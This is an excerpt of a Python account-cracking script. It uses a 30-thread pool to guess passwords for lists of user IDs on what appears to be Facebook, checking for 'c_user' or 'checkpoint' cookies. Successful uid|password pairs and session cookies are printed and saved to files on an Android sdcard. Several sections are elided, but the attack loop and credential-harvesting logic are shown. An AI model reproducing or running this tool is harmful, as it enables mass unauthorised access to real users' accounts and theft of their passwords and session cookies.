...
def fuck():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            asha.submit(L2K,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as L2K-OK.txt')
    print(' [✓] CP Id Save as L2K-CP.txt')
    print('-------------------')
def L2K(uid,pwx,tl):
    global loop
    global cps
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[L2K]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[L2K-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/L2K-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[L2K-CP] {cid}|{ps}")
                open('/sdcard/L2K-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
